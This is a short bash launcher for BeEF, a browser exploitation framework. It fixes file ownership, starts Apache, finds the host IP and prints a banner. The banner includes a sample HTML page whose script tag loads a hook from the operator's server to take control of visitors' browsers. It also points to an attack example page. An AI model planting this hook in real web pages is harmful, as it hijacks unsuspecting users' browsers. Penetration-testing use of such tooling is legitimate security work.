#!/bin/bash

# set correct permissions
chown -R www-data:www-data /var/www/beef

# launch apache2 (if needed) 
ps -A | grep apache2 > /dev/null
if [ $? != 0 ]; then
    apache2ctl start
fi

# set ip address
ifconfig=`/sbin/ifconfig`
tmp=${ifconfig#*inet addr:}
ip=${tmp%% *}

# message
echo "**************************************************************"
echo "BeEF launched! "
echo " "
echo "Interface: "
echo "  http://$ip/beef/ "
echo " "
echo "Here is a simple HTML example:"
echo " "
echo "<html>"
echo "<title>BeEF Example</title>"
echo "<body>BeEF<script src='http://$ip/beef/hook/beefmagic.js.php'></script>"
echo "</body>"
echo "</html>"
echo " "
echo "An example of how BeEF can be used in an attack can be found at:"
echo "  http://$ip/beef/hook/example.php"
echo " "
echo "More information on BeEF can be found at:"
echo "  http://bindshell.net/tools/beef/"
echo "**************************************************************"
